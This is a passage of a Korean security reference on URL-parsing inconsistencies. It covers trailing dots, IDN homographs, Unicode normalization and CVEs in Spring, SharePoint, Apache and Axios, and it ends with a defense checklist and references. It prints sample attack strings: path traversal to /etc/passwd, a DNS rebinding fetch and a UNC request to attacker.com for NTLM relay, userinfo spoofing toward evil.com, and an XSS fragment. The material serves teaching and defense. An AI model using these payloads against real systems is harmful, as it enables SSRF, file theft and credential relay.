**공격 벡터**:

```
공격 예시 1: CORS 우회
CORS Allow-Origin: https://trusted.com

요청: Origin: https://trusted.com.
→ 일부 브라우저/서버: 동일 도메인으로 취급
→ WHATWG 엄격 구현: 서로 다른 도메인
→ 정책 불일치
```

```
공격 예시 2: Cookie 격리 우회
Set-Cookie: session=secret; Domain=example.com

요청: https://example.com./
→ 브라우저마다 쿠키 전송 여부 다름
→ 쿠키 격리 정책 우회 또는 세션 탈취
```

```
공격 예시 3: DNS Rebinding
attacker.com. → A 레코드: 1.2.3.4 (공격자 서버)

피해자 브라우저:
1. https://attacker.com. 접근 → 1.2.3.4
2. JavaScript: fetch('https://attacker.com./internal')
3. DNS 캐시 만료 후:
   attacker.com. → A 레코드: 127.0.0.1
4. 내부 서버 접근
```

**실제 사례**:
- **WHATWG 명시적 차단**: Trailing dot을 서로 다른 호스트로 취급하여 혼동 방지
- 일부 CDN/WAF가 trailing dot을 정규화하지 않아 정책 우회 발생

**스펙 기반 방어**:
- **WHATWG 설계 결정**: `example.com` ≠ `example.com.` (명시적 구분)
- **DNS RFC**: Trailing dot은 FQDN의 정식 표기
- **실무 권장**:
  - Trailing dot 발견 시 제거 또는 명시적 거부
  - CORS, CSP, Cookie Domain 등 보안 정책은 정규화된 도메인 기준
  - DNS 쿼리 전에 trailing dot 정규화

---

### 17. 유니코드 정규화와 IDN (RFC 3987, WHATWG §3.3)

**스펝 원문 동작**:
- **RFC 3987 (IRI)**: Internationalized Resource Identifiers - 유니코드 문자 허용
- **WHATWG URL Standard §3.3**: Domain to ASCII 변환 (Punycode)
- **유니코드 정규화**: NFC, NFD, NFKC, NFKD 등 다양한 형식

**보안적 함의**:
유니코드 문자는 시각적으로 유사하거나 정규화 후 동일해질 수 있어 **Homograph Attack** 위험.

**공격 벡터**:

```
공격 예시 1: IDN Homograph Attack
공격자 도메인: exаmple.com (Cyrillic 'а' U+0430)
정상 도메인: example.com (Latin 'a' U+0061)

Punycode: xn--exmple-7fd.com

사용자: 시각적으로 구분 불가 → 피싱 사이트 접근
```

```
공격 예시 2: 유니코드 정규화 악용 (HostSplit/HostBond)
특정 유니코드 문자가 정규화 후 empty string:
U+180E (Mongolian Vowel Separator)

입력: http://trusted\u180e.com@evil.com
정규화 전: trusted<U+180E>.com (userinfo)
정규화 후: trusted.com (userinfo 없음)
→ 보안 필터 우회
```

```
공격 예시 3: Zero-Width 문자 삽입
입력: http://trusted\u200B.com  (Zero-Width Space)

일부 브라우저: 정규화하여 trusted.com
일부 필터: 문자열 매칭 실패 → 차단 또는 허용 불일치
```

**실제 사례**:
- **2017년 Xudong Zheng**: `xn--80ak6aa92e.com` (Cyrillic으로 `apple.com` 스푸핑)이 모든 주요 브라우저에서 시각적으로 구분 불가능하게 표시됨
- **HostSplit/HostBond (Black Hat USA 2019)**: 유니코드 정규화를 이용한 도메인 위장 기법 발표

**스펙 기반 방어**:
- **RFC 3987 §3.2**: IRI는 URI로 변환 시 percent-encoding 필요
- **WHATWG §3.3**: Domain to ASCII (Punycode) 변환 필수
- **실무 권장**:
  - IDN 사용 시 Punycode 형태로 변환 후 검증
  - Mixed-script domain 차단 (Latin + Cyrillic 혼용 등)
  - 브라우저: Punycode 형태로 표시 (Chrome 정책)
  - Zero-width, invisible 문자 제거

---

## 제4부: 최신 CVE 및 공격 사례 종합

### 18. Spring Framework URL 파싱 취약점 (CVE-2024-22259, CVE-2024-22243, CVE-2024-22262)

**취약점 설명**:
Spring Framework의 `UriComponentsBuilder`가 외부 제공 URL을 파싱하고 호스트 검증을 수행할 때, 검증과 실제 HTTP 요청 간 파싱 차이로 인해 SSRF 및 Open Redirect 발생.

**영향 받는 버전**:
- Spring Framework 6.1.0 ~ 6.1.4
- Spring Framework 6.0.0 ~ 6.0.17
- Spring Framework 5.3.0 ~ 5.3.32

**공격 메커니즘**:
```java
// 취약한 코드 패턴
String userProvidedUrl = request.getParameter("url");

// 1단계: UriComponentsBuilder로 파싱 및 검증
UriComponents uri = UriComponentsBuilder.fromUriString(userProvidedUrl).build();
String host = uri.getHost();

if (allowedHosts.contains(host)) {  // 호스트 검증
    // 2단계: 실제 HTTP 요청
    restTemplate.getForObject(userProvidedUrl, String.class);  // 다른 파서 사용!
}
```

**스펙 관련 근본 원인**:
- `UriComponentsBuilder`와 실제 HTTP 클라이언트(Apache HttpClient, OkHttp 등)가 다른 파싱 로직 사용
- RFC 3986 해석 차이 (특히 authority 컴포넌트 추출)

**패치 및 완화**:
- Spring Framework 6.1.5, 6.0.18, 5.3.33 이상 업그레이드
- 또는 검증과 요청에 동일한 파서 사용

---

### 19. SharePoint XXE via URL Parsing Confusion (CVE-2024-30043)

**취약점 설명**:
SharePoint Server와 Cloud에서 URL 파싱 혼동을 악용하여 XXE (XML External Entity) 주입 → 파일 읽기 및 SSRF.

**공격 메커니즘**:
1. SharePoint의 XML 파서와 URL 검증 로직이 서로 다른 URL 해석
2. 공격자가 조작된 URL을 XML에 삽입
3. URL 검증 레이어: 안전한 호스트로 판단
4. XML 파서: 외부 엔티티로 내부 파일 또는 내부 네트워크 접근

**스펙 관련 근본 원인**:
- XML 명세와 URI 명세 간 상호작용 불일치
- URL 파싱 differential (parser A vs parser B)

**패치**:
- Microsoft 2024년 5월 보안 업데이트 적용

---

### 20. Apache HTTP Server Confusion Attacks (CVE-2024-38473, CVE-2024-38476, CVE-2024-38477)

**연구자**: Orange Tsai (DEVCORE), Black Hat USA 2024

**취약점 개요**:
Apache HTTP Server의 아키텍처 설계상 3가지 혼동 공격:
1. **Filename Confusion**: `r->filename` 필드가 파일시스템 경로여야 하지만 일부 모듈이 URL로 취급
2. **DocumentRoot Confusion**: 절대 경로 접근 시 DocumentRoot 검증 우회
3. **Handler Confusion**: 요청 핸들러 선택 로직 혼동

**공격 벡터**:
```
예시 1: DocumentRoot 탈출
GET /cgi-bin/../../../../../etc/passwd HTTP/1.1

예시 2: ACL 우회
GET /protected/resource?query HTTP/1.1
→ '?' 하나로 ACL/Auth 우회

예시 3: 백슬래시를 이용한 NTLM 강제 인증
GET \\attacker.com\share HTTP/1.1
→ UNC 경로로 해석 → NTLM 인증 전송 → SSRF → NTLM Relay → RCE
```

**스펙 관련 근본 원인**:
- URL 파싱과 파일시스템 경로 처리의 경계 불명확
- RFC 3986의 경로 구분자와 파일시스템 구분자 혼동

**패치**:
- Apache HTTP Server 2.4.60 (2024년 7월 1일)

---

### 21. URL Normalization SSRF in Axios (#7315)

**취약점 설명**:
JavaScript HTTP 클라이언트 라이브러리 Axios가 URL을 자동 정규화하여 SSRF 필터 우회.

**공격 메커니즘**:
```javascript
// 공격자 입력
const url = "https:google.com";  // 슬래시 누락

// 보안 필터: "://" 패턴 확인
if (!url.includes("://")) {
    throw new Error("Invalid URL");  // 차단
}

// Axios: 자동 정규화
axios.get(url);  // 내부적으로 https://google.com 으로 변환 → SSRF
```

**스펙 관련 근본 원인**:
- RFC 3986: Scheme 후 `://` 필수
- Axios: 관대한 파싱으로 자동 수정

**완화**:
- Axios 최신 버전 사용 또는 URL 검증 강화

---

### 22. Path Traversal via Percent-Encoding (CVE-2021-41773, CVE-2021-42013)

**취약점 설명**:
Apache HTTP Server 2.4.49, 2.4.50에서 경로 정규화 로직 변경으로 percent-encoding된 경로 순회 문자가 처리되지 않아 인증 우회 및 임의 파일 읽기.

**공격 메커니즘**:
```
GET /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1

2.4.49 이전: /.%2e/ → /../ 정규화 → 경로 순회 차단
2.4.49: /.%2e/를 정규화하지 않음 → 그대로 통과 → /etc/passwd 접근
```

**스펙 관련 근본 원인**:
- RFC 3986 §6.2.2: Percent-decoding과 경로 정규화의 순서 불명확
- 구현 변경 시 보안 함의 미고려

**패치**:
- Apache 2.4.51 이상

---

## 부록: 공격-스펙-방어 매핑 종합표

| 공격 유형 | 악용하는 스펙 동작 | RFC/스펙 참조 | 공격 예시 | 스펙 기반 방어 |
|----------|------------------|--------------|---------|--------------|
| **Scheme Confusion** | RFC 3986은 scheme 필수, WHATWG는 상대 URL 허용 | RFC 3986 §3 vs WHATWG §4.1 | `google.com/abc` → 파서마다 다른 해석 | 절대 URI만 허용, 동일 파서 사용 |
| **Userinfo Spoofing** | `user:pass@host` 문법은 deprecated이지만 유효 | RFC 3986 §3.2.1, §7.5 | `https://trusted.com@evil.com` | Userinfo 포함 URL 거부, WHATWG 정책 따름 |
| **Percent-Encoding 재귀 디코딩** | 재귀 디코딩 금지 규칙 미준수 | RFC 3986 §2.4 MUST | `%252e%252e%252f` → 2회 디코딩 → `../` | 정확히 1회만 디코딩, 재귀 금지 |
| **Slashes/Backslash Confusion** | 백슬래시 처리 불명확 | RFC 3986 (명시 없음) vs WHATWG | `https:\\evil.com` | 백슬래시 포함 URL 거부 또는 명시적 정규화 |
| **IP Address Obfuscation** | 레거시 IP 표기법 지원 | RFC 3986 §7.4 | `http://0177.0.0.1` (8진수) | 모든 IP 형식 정규화 후 검증, 전용 IP 파서 사용 |
| **Fragment-based XSS** | Fragment는 서버 전송 안 됨 | RFC 3986 §3.5 | `#<script>alert(1)</script>` | Fragment 입력 검증, CSP 강화 |
| **Host Extraction 불일치** | `getHost()` 메서드마다 다른 동작 | 구현체 차이 | Java URL vs Python urlparse | RFC 3986 기준 명시적 파싱, allow-list 검증 |
| **URL Encoding Confusion** | 인코딩된 호스트 처리 불일치 | RFC 3986 §2.1 | `http://127.%30.%30.1` | 입력 즉시 디코딩, 정규화 후 검증 |
| **Tabs/Newlines 제거** | WHATWG는 제어 문자 자동 제거 | WHATWG §4.1 | `http://trusted\n.com@evil.com` | 제어 문자 발견 시 거부 (자동 제거 금지) |
| **Case Sensitivity 악용** | Scheme/host는 대소문자 무시, path는 구분 | RFC 3986 §6.2.2.1 | `/Admin` vs `/admin` | 서버 처리 방식과 일치하는 검증 |
| **Path Traversal** | 경로 정규화 알고리즘 | RFC 3986 §6.2.2.3 | `../../etc/passwd` | Decode → Normalize → Validate 순서 엄수 |
| **Default Port 불일치** | 기본 포트 생략 가능 | RFC 3986 §6.2.3 | `:80` vs 생략 | 기본 포트 제거 정규화, 정규화된 형태로 정책 저장 |
| **Trailing Dot Confusion** | WHATWG는 구분, DNS는 FQDN | WHATWG 설계 결정 | `example.com` vs `example.com.` | Trailing dot 제거 또는 명시적 거부 |
| **IDN Homograph** | 유니코드 시각적 유사성 | RFC 3987, WHATWG §3.3 | Cyrillic 'а' vs Latin 'a' | Punycode 변환, mixed-script 차단 |
| **Cache Key Confusion** | 정규화되지 않은 URL → 다른 캐시 키 | RFC 3986 §6.2.2 | `/api` vs `/api/%2F` | 정규화된 URL로 캐시 키 생성 |
| **Parser Differential SSRF** | 검증 파서 ≠ 요청 파서 | 구현체 간 불일치 | Spring UriComponentsBuilder | 동일 파서 사용, Spring 패치 적용 |

---

## 부록: 보안 검증 체크리스트

### 입력 검증 단계

- [ ] **1. 절대 URI 강제**: Scheme이 명시된 절대 URI만 허용 (상대 URL 거부)
- [ ] **2. Userinfo 금지**: `user:pass@host` 형식 포함된 URL 즉시 거부
- [ ] **3. 제어 문자 검사**: 탭(`\t`), 개행(`\n`, `\r`), NULL 등 제어 문자 포함 시 거부 (자동 제거 금지)
- [ ] **4. 백슬래시 검사**: 백슬래시(`\`) 포함 시 거부 또는 명시적 정규화 정책 수립

### 정규화 단계

- [ ] **5. Percent-Decoding (1회만)**: 입력 받은 즉시 정확히 1회 디코딩 (재귀 디코딩 금지)
- [ ] **6. Unreserved 문자 디코딩**: `A-Za-z0-9-._~` 인코딩 발견 시 디코딩
- [ ] **7. Scheme/Host 소문자화**: Scheme과 Host만 소문자 변환 (Path는 대소문자 유지)
- [ ] **8. 경로 정규화**: `remove_dot_segments` 알고리즘 적용 (`. `와 `..` 제거)
- [ ] **9. 기본 포트 제거**: HTTP:80, HTTPS:443 등 기본 포트 명시 시 제거
- [ ] **10. Trailing Dot 처리**: 도메인 끝의 `.` 제거 또는 명시적 정책 수립
- [ ] **11. IDN Punycode 변환**: 유니코드 도메인을 Punycode로 변환

### 보안 검증 단계

- [ ] **12. IP 주소 정규화**: 8진수, 16진수, 정수 표기 등 모든 형식을 정규 형식으로 변환 후 검증
- [ ] **13. Allow-list 검증**: Scheme, Host, Port 조합을 allow-list와 비교 (deny-list 사용 금지)
- [ ] **14. 내부 IP 차단**: 정규화된 IP가 내부 네트워크 범위인지 검사 (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16 등)
- [ ] **15. 경로 범위 검증**: 정규화된 경로가 DocumentRoot 또는 허용된 디렉토리 내부인지 검증
- [ ] **16. Symlink 검증**: Symlink 경로를 실제 경로로 해석 (`realpath()`) 후 재검증

### 실행 단계

- [ ] **17. 동일 파서 사용**: 검증에 사용한 파서와 동일한 파서로 실제 요청 수행
- [ ] **18. 재파싱 금지**: 검증 후 URL을 절대 재파싱하지 않음 (검증된 객체 재사용)
- [ ] **19. 리다이렉트 제한**: HTTP 리다이렉트 자동 추적 비활성화 또는 리다이렉트 대상도 검증
- [ ] **20. 타임아웃 설정**: 연결 타임아웃 및 읽기 타임아웃 짧게 설정하여 slowloris 공격 방지

### 로깅 및 모니터링

- [ ] **21. URL 마스킹**: 로그 기록 전 URL에서 Userinfo, Fragment, 민감한 쿼리 파라미터 마스킹
- [ ] **22. 실패 로깅**: URL 검증 실패 시 입력값과 실패 원인 로깅 (공격 패턴 분석용)
- [ ] **23. 이상 패턴 감지**: 동일 IP에서 반복적인 검증 실패 시 알림

### 아키텍처 수준

- [ ] **24. 단일 URL 파서 라이브러리**: 전체 애플리케이션에서 하나의 검증된 URL 파서 라이브러리만 사용
- [ ] **25. 정기적 업데이트**: URL 파서 라이브러리 및 HTTP 클라이언트 최신 버전 유지 (CVE 모니터링)
- [ ] **26. 최소 권한 원칙**: URL 요청을 처리하는 서비스 계정의 권한 최소화

---

## 참고 문헌 및 출처

### RFC 및 표준 스펙
- [RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax](https://www.rfc-editor.org/rfc/rfc3986.html)
- [WHATWG URL Living Standard](https://url.spec.whatwg.org/)
- [RFC 3987 - Internationalized Resource Identifiers (IRIs)](https://www.rfc-editor.org/rfc/rfc3987.html)

### CVE 및 보안 권고
- [CVE-2024-22259: Spring Framework URL Parsing with Host Validation](https://spring.io/security/cve-2024-22259/)
- [CVE-2024-22243: Spring Framework URL Parsing with Host Validation](https://spring.io/security/cve-2024-22243/)
- [CVE-2024-22262: Spring Framework URL Parsing with Host Validation (3rd report)](https://spring.io/security/cve-2024-22262/)
- [CVE-2024-30043: SharePoint XXE via URL Parsing Confusion](https://www.thezdi.com/blog/2024/5/29/cve-2024-30043-abusing-url-parsing-confusion-to-exploit-xxe-on-sharepoint-server-and-cloud)
- [CVE-2024-38473, CVE-2024-38476, CVE-2024-38477: Apache HTTP Server Confusion Attacks](https://httpd.apache.org/security/vulnerabilities_24.html)
- [CVE-2021-41773: Apache HTTP Server Path Traversal](https://www.hackthebox.com/blog/cve-2021-41773-explained)

### 연구 논문 및 컨퍼런스 발표
- [Orange Tsai - Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server (Black Hat USA 2024)](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [PortSwigger Research - URL validation bypass cheat sheet (2024 Edition)](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
- [Snyk - URL confusion vulnerabilities in the wild: Exploring parser inconsistencies](https://snyk.io/blog/url-confusion-vulnerabilities/)
- [Claroty Team82 - Exploiting URL Parsing Confusion](https://claroty.com/team82/research/exploiting-url-parsing-confusion)
- [SonarSource - Security Implications of URL Parsing Differentials](https://www.sonarsource.com/blog/security-implications-of-url-parsing-differentials/)
- [Orange Tsai - A New Era of SSRF: Exploiting URL Parser in Trending Programming Languages (Black Hat 2017)](https://blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
- [Black Hat USA 2019 - HostSplit: Exploitable Antipatterns in Unicode Normalization](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)

### 실무 가이드 및 도구
- [OWASP - Server Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - What is SSRF (Server-side request forgery)?](https://portswigger.net/web-security/ssrf)
- [GitHub - Axios Issue #7315: Normalization of url cause an ssrf security bypass](https://github.com/axios/axios/issues/7315)
- [Joshua Rogers - proxy_pass: nginx's Dangerous URL Normalization](https://joshua.hu/proxy-pass-nginx-decoding-normalizing-url-path-dangerous)

### 기타 참고 자료
- [Wikipedia - Percent-encoding](https://en.wikipedia.org/wiki/Percent-encoding)
- [Neil Madden - Can you ever (safely) include credentials in a URL?](https://neilmadden.blog/2019/01/16/can-you-ever-safely-include-credentials-in-a-url/)
- [Medium - Say goodbye to URLs with embedded credentials](https://medium.com/@lmakarov/say-goodbye-to-urls-with-embedded-credentials-b051f6c7b6a3)

---

## 문서 변경 이력

| 날짜 | 버전 | 변경 내용 |
|------|------|----------|
| 2026-02-08 | 1.0 | 초판 작성 - RFC 3986 및 WHATWG URL Standard 기반 보안 분석 |

---

**면책 조항**: 이 문서는 교육 및 보안 연구 목적으로 작성되었습니다. 여기에 설명된 공격 기법을 무단으로 사용하는 것은 불법이며, 저자는 이 정보의 오용에 대해 책임지지 않습니다.
